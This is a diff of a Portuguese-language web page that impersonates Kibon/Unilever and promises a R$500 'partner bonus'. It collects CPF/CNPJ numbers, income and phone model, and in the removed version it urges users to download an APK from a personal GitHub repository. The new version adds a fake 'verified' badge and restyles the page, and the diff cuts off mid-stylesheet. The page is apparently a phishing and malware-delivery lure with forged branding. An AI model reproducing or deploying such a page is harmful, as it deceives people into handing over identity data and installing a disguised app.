@@ -3,124 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kibon - Resgate seu Bônus</title>
+    <title>Parceiro Kibon - Resgate de Bônus</title>
     <style>
-        :root { --vermelho: #e31b23; --amarelo: #ffcc00; --fundo: #f0f0f0; }
-        body { font-family: sans-serif; background-color: var(--fundo); display: flex; flex-direction: column; align-items: center; margin: 0; padding: 20px; }
-        
-        .card { background: white; width: 100%; max-width: 450px; border-radius: 40px; padding: 40px 30px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-top: 30px; box-sizing: border-box; }
-        
-        .header-bonus { background: var(--vermelho); color: white; text-align: center; padding: 25px; border-radius: 20px; margin-bottom: 30px; }
-        .header-bonus h2 { margin: 0; font-size: 24px; }
-        .header-bonus p { margin: 5px 0 0; color: var(--amarelo); font-weight: bold; font-size: 14px; }
-        
-        label { display: block; font-weight: bold; margin-bottom: 8px; color: #444; font-size: 13px; text-transform: uppercase; }
-        .form-group { margin-bottom: 20px; }
-        
-        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 15px; font-size: 16px; box-sizing: border-box; outline: none; background-color: #fff; }
-        input:focus, select:focus { border-color: var(--vermelho); }
-        
-        .row { display: flex; gap: 15px; }
-        .row div { flex: 1; }
-        
-        .btn-download { display: block; width: 100%; background: var(--vermelho); color: white; text-align: center; padding: 22px; text-decoration: none; border-radius: 50px; font-weight: bold; font-size: 18px; margin-top: 20px; box-shadow: 0 8px 15px rgba(227, 27, 35, 0.4); transition: background 0.3s; }
-        .btn-download:hover { background: #c2171d; }
-        
-        .error-msg { color: var(--vermelho); font-size: 12px; font-weight: bold; display: none; margin-top: 5px; }
-        footer { margin-top: 50px; color: #bbb; font-size: 11px; text-align: center; text-transform: uppercase; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <div class="header-bonus">
-        <h2>BÔNUS DE R$ 500,00</h2>
-        <p>EXCLUSIVO PARA PARCEIROS</p>
-    </div>
-
-    <form id="formKibon">
-        <div class="form-group">
-            <label>Perfil Profissional</label>
-            <select required>
-                <option value="">Selecione seu perfil...</option>
-                <option>Ponto de Venda (PDV)</option>
-                <option>Dono de Estabelecimento</option>
-                <option>Revendedor Autorizado</option>
-            </select>
-        </div>
-
-        <div class="form-group">
-            <label>CPF ou CNPJ (Apenas números)</label>
-            <input type="text" id="documento" placeholder="Digite aqui..." maxlength="14" required>
-            <span id="erroDoc" class="error-msg">⚠️ Documento inválido! Digite um CPF ou CNPJ real.</span>
-        </div>
-
-        <div class="row form-group">
-            <div style="flex: 0.3;">
-                <label>Estado</label>
-                <select id="uf" required>
-                    <option value="">UF</option>
-                    <option>AC</option><option>AL</option><option>AP</option><option>AM</option><option>BA</option>
-                    <option>CE</option><option>DF</option><option>ES</option><option>GO</option><option>MA</option>
-                    <option>MT</option><option>MS</option><option>MG</option><option>PA</option><option>PB</option>
-                    <option>PR</option><option>PE</option><option>PI</option><option>RJ</option><option>RN</option>
-                    <option>RS</option><option>RO</option><option>RR</option><option>SC</option><option>SP</option>
-                    <option>SE</option><option>TO</option>
-                </select>
-            </div>
-            <div style="flex: 0.7;">
-                <label>Renda Mensal do Comércio</label>
-                <select required>
-                    <option value="">Selecione a renda...</option>
-                    <option>Até R$ 2.000,00</option>
-                    <option>R$ 2.000,00 a R$ 5.000,00</option>
-                    <option>R$ 5.000,00 a R$ 10.000,00</option>
-                    <option>Acima de R$ 10.000,00</option>
-                </select>
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label>Modelo do seu Android</label>
-            <select required>
-                <option value="">Selecione o aparelho...</option>
-                <optgroup label="SAMSUNG">
-                    <option>Linha Galaxy S (S20, S21, S22, S23, S24)</option>
-                    <option>Linha Galaxy A / M</option>
-                </optgroup>
-                <optgroup label="MOTOROLA">
-                    <option>Moto G Series</option>
-                    <option>Moto Edge / E Series</option>
-                </optgroup>
-                <option>Xiaomi / Redmi / POCO</option>
-                <option>Outros aparelhos Android</option>
-            </select>
-        </div>
-
-        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-download">
-            BAIXAR APK E RESGATAR
-        </a>
-    </form>
-</div>
-
-<footer>© 2026 KIBON BRASIL - UNILEVER. TODOS OS DIREITOS RESERVADOS.</footer>
-
-<script>
-    // Validação de CPF/CNPJ (Simples)
-    document.getElementById('documento').addEventListener('blur', function() {
-        const val = this.value.replace(/\D/g, '');
-        const erro = document.getElementById('erroDoc');
-        
-        // Verifica se tem 11 (CPF) ou 14 (CNPJ) dígitos
-        if (val.length !== 11 && val.length !== 14) {
-            erro.style.display = 'block';
-            this.style.borderColor = '#e31b23';
-        } else {
-            erro.style.display = 'none';
-            this.style.borderColor = '#ddd';
+        :root { 
+            --vermelho-kibon: #e31b23; 
+            --amarelo-kibon: #ffcc00; 
+            --branco: #ffffff;
+            --gradiente: linear-gradient(180deg, #e31b23 0%, #f0f0f0 40%);
         }
-    });
-</script>
 
-</body>
-</html>
+        body { 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            background: var(--gradiente); 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            margin: 0; 
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        /* Título Principal Fora do Card */
+        .main-title {
+            color: var(--branco);
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .main-title h1 { margin: 0; font-size: 28px; font-style: italic; text-transform: uppercase; letter-spacing: -1px; }
+        .main-title p { margin: 5px 0; font-weight: bold; font-size: 14px; opacity: 0.9; }
+
+        .card { 
+            background: white; 
+            width: 100%; 
+            max-width: 420px; 
+            border-radius: 40px; 
+            padding: 35px 25px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2); 
+            box-sizing: border-box; 
+            position: relative;
+        }
+
+        /* Selo de Verificado */
+        .verified-badge {
+            position: absolute;
+            top: -15px;
+            right: 20px;
+            background: #007bff;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-bonus { 
+            background: var(--vermelho-kibon); 
+            color: white; 
+            text-align: center; 
+            padding: 25px; 
+            border-radius: 25px; 
+            margin-bottom: 30px;
+            border: 2px solid var(--amarelo-kibon);
+        }
+        .header-bonus h2 { margin: 0; font-size: 26px; letter-spacing: 1px; }
+        .header-bonus p { margin: 8px 0 0; color: var(--amarelo-kibon); font-weight: 900; font-size: 16px; text-shadow: 1px 1px 2px rgba(0,0,0,0.2); }
+
+        label { display: block; font-weight: bold; margin-bottom: 6px; color: #555; font-size: 12px; text-transform: uppercase; padding-left: 5px;}
+        .form-group { margin-bottom: 18px; }
+        
+        input, select { 
+            width: 100%; 
+            padding: 16px; 
+            border: 2px solid #f2f2f2; 
+            border-radius: 18px; 
+            font-size: 16px; 
+            box-sizing: border-box; 
+            outline: none; 
+            transition: 0.3s;
+            background-color: #fafafa;
+        }
+        input:focus, select:focus { border-color: var(--vermelho-kibon); background-color: #fff; }
+
+        .row { display: flex; gap: 12px; }
+        .row div { flex: 1; }
+
+        .btn-download { 
+            display: block; 
+            width: 100%; 
+            background: var(--vermelho-kibon); 
+            color: white; 
+            text-align: center; 
+            padding: 22px; 
+            text-decoration: none; 
+            border-radius: 50px; 
+            font-weight: bold; 
+            font-size: 20px; 
+            margin-top: 25px; 
+            box-shadow: 0 10px 20px rgba(227, 27, 35, 0.4); 
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+        .btn-download:hover { transform: scale(1.02); background: #ff1a21; }
+
+        .error-msg { color: var(--vermelho-kibon); font-size: 11px;
